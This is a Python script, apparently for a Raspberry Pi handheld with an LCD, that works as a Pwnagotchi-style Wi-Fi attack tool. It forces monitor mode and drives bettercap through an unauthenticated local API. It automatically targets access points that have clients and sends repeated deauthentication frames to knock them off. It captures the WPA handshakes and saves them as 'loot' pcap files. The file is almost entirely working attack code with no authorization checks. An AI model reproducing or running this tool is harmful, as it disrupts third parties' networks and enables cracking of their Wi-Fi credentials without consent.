#!/usr/bin/env python3
"""
KTOx Payload – Pwnagotchi (Working)
====================================
Author: wickednull

- Bettercap REST API handshake sniffer
- Tamagotchi face on LCD
- Auto-targets APs with clients
- Saves handshakes to /root/KTOx/loot/Handshakes/

Controls:
  KEY3 – exit
"""

import os
import sys
import time
import threading
import json
import requests
import subprocess
import random
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD (exact pattern from Auto Crack)
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()

f9 = font(9)
f11 = font(11)

# ----------------------------------------------------------------------
# Bettercap REST API
# ----------------------------------------------------------------------
BETTERCAP_HOST = "127.0.0.1"
BETTERCAP_PORT = 8081
API_URL = f"http://{BETTERCAP_HOST}:{BETTERCAP_PORT}/api"

# Global state
handshake_count = 0
ap_count = 0
client_count = 0
mood = "normal"
console_msg = "Starting..."
bettercap_proc = None
running = True

faces = {
    "normal":   "(◕‿‿◕)",
    "happy":    "(◕‿‿◕)",
    "attacking": "(⌐■_■)",
    "lost":     "(X\\/X)",
    "assoc":    "(°▃▃°)",
    "excited":  "(☼‿‿☼)",
    "missed":   "(☼/\\☼)",
    "searching": "(ಠ_↼ )"
}

def set_mood(new_mood):
    global mood
    mood = new_mood
    if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
        threading.Timer(2.0, lambda: set_mood("normal") if mood == new_mood else None).start()
    elif new_mood == "happy":
        threading.Timer(4.0, lambda: set_mood("normal") if mood == new_mood else None).start()

# ----------------------------------------------------------------------
# Monitor mode (same as Auto Crack)
# ----------------------------------------------------------------------
def enable_monitor_mode(iface="wlan0"):
    subprocess.run("airmon-ng check kill", shell=True)
    subprocess.run(f"ip link set {iface} down", shell=True)
    subprocess.run(f"iw dev {iface} set type monitor", shell=True)
    subprocess.run(f"ip link set {iface} up", shell=True)
    mon = f"{iface}mon"
    if not os.path.exists(f"/sys/class/net/{mon}"):
        subprocess.run(f"airmon-ng start {iface}", shell=True)
    return mon

def disable_monitor_mode(iface="wlan0"):
    subprocess.run(f"airmon-ng stop {iface}mon", shell=True)
    subprocess.run(f"ip link set {iface} down", shell=True)
    subprocess.run(f"iw dev {iface} set type managed", shell=True)
    subprocess.run(f"ip link set {iface} up", shell=True)
    subprocess.run("systemctl restart NetworkManager", shell=True)

# ----------------------------------------------------------------------
# Bettercap control
# ----------------------------------------------------------------------
def start_bettercap(mon_iface):
    global bettercap_proc
    cmd = [
        "bettercap", "-eval",
        f"set api.rest true; set api.rest.username ''; set api.rest.password ''; "
        f"wifi.recon on; wifi.show.sort clients desc; "
        f"events.stream off; set wifi.interface {mon_iface}; wifi.recon on"
    ]
    bettercap_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    try:
        r = requests.get(f"{API_URL}/session", timeout=2)
        return r.status_code == 200
    except:
        return False

def stop_bettercap():
    global bettercap_proc
    if bettercap_proc:
        bettercap_proc.terminate()
        bettercap_proc.wait(timeout=2)
        bettercap_proc = None

def get_wifi_data():
    try:
        r = requests.get(f"{API_URL}/wifi", timeout=2)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def associate_with_ap(bssid):
    try:
        r = requests.post(f"{API_URL}/wifi/ap/{bssid}", timeout=5)
        return r.status_code == 200
    except:
        return False

def deauth_client(bssid, client_mac, count=10):
    try:
        payload = {"bssid": bssid, "client": client_mac, "count": count}
        r = requests.post(f"{API_URL}/wifi/deauth", json=payload, timeout=2)
        return r.status_code == 200
    except:
        return False

def has_handshake(bssid):
    try:
        r = requests.get(f"{API_URL}/wifi/handshakes", timeout=2)
        if r.status_code == 200:
            handshakes = r.json()
            for hs in handshakes:
                if hs.get("bssid") == bssid:
                    return True
    except:
        pass
    return False

def save_handshake(bssid, essid):
    global handshake_count
    handshake_count += 1
    loot_dir = "/root/KTOx/loot/Handshakes"
    os.makedirs(loot_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
    src_pcap = "/root/bettercap-wifi-handshakes.pcap"
    if os.path.exists(src_pcap):
        dest = os.path.join(loot_dir, f"{safe_essid}_{bssid}_{ts}.pcap")
        subprocess.run(f"cp {src_pcap} {dest}", shell=True)
        with open(os.path.join(loot_dir, "handshake_log.txt"), "a") as log:
            log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
    set_mood("happy")
    global console_msg
    console_msg = f"Handshake! Total: {handshake_count}"

# ----------------------------------------------------------------------
# LCD drawing (same as Auto Crack)
# ----------------------------------------------------------------------
def draw_screen():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill="#8B0000")
    d.text((4, 3), "PWNAGOTCHI", font=f9, fill="#FF3333")
    y = 20
    d.text((4, y), f"HS: {handshake_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"APs: {ap_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"CLI: {client_count}", font=f9, fill="#FFBBBB"); y += 12
    face_char = faces.get(mood, faces["normal"])
    try:
        face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
    except:
        face_font = f11
    bbox = d.textbbox((0, 0), face_char, font=face_font)
    face_w = bbox[2] - bbox[0]
    face_x = (W - face_w) // 2
    d.text((face_x, 50), face_char, font=face_font, fill="#00FF00")
    d.text((4, H-30), console_msg[:23], font=f9, fill="#AAAAAA")
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "K3=Exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Main (attack logic in main loop, no separate thread)
# ----------------------------------------------------------------------
def main():
    global running, ap_count, client_count, console_msg

    # Show starting message
    draw_screen()
    time.sleep(0.5)

    # Enable monitor mode
    iface = "wlan0"
    mon = enable_monitor_mode(iface)
    if not mon:
        draw_screen()
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "Monitor mode failed", font=f9, fill="red")
        d.text((4, 55), "Check airmon-ng", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    # Start bettercap
    if not start_bettercap(mon):
        draw_screen()
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "Bettercap failed", font=f9, fill="red")
        d.text((4, 55), "Check installation", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        disable_monitor_mode(iface)
        GPIO.cleanup()
        return

    console_msg = "Bettercap ready"
    set_mood("normal")
    draw_screen()

    # Main loop (attack logic inside, not separate thread)
    last_attack = 0
    held = {}

    while running:
        now = time.time()
        # Update stats every 2 seconds
        data = get_wifi_data()
        if data:
            aps = data.get("aps", [])
            ap_count = len(aps)
            total_clients = 0
            for ap in aps:
                total_clients += len(ap.get("clients", []))
            client_count = total_clients

        # Attack logic (run every 10 seconds)
        if now - last_attack > 10:
            last_attack = now
            # Find a target
            data = get_wifi_data()
            if data:
                aps = data.get("aps", [])
                target = None
                for ap in aps:
                    bssid = ap.get("bssid")
                    essid = ap.get("essid", "")
                    clients = ap.get("clients", [])
                    if clients and not has_handshake(bssid):
                        target = (bssid, essid, clients)
                        break
                if target:
                    bssid, essid, clients = target
                    console_msg = f"Target: {essid[:12]}"
                    set_mood("assoc")
                    draw_screen()
                    associate_with_ap(bssid)
                    time.sleep(1)
                    target_client = random.choice(clients)
                    client_mac = target_client.get("mac", "")
                    console_msg = f"Deauth: {client_mac[-6:]}"
                    set_mood("attacking")
                    draw_screen()
                    for _ in range(3):
                        deauth_client(bssid, client_mac, count=10)
                        time.sleep(0.5)
                    for _ in range(10):
                        if has_handshake(bssid):
                            save_handshake(bssid, essid)
                            break
                        time.sleep(1)
                    set_mood("normal")
                    draw_screen()
                else:
                    console_msg = f"Scanning... {ap_count} APs"
                    draw_screen()

        # Button handling
        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
        for n, down in pressed.items():
            if down:
                if n not in held: held[n] = now
            else:
                held.pop(n, None)
        if pressed.get("KEY3") and (now - held.get("KEY3", now)) <= 0.05:
            break

        draw_screen()
        time.sleep(0.1)

    # Cleanup
    stop_bettercap()
    disable_monitor_mode(iface)
    LCD.LCD_Clear()
    GPIO.cleanup()
    os._exit(0)

if __name__ == "__main__":
    main()
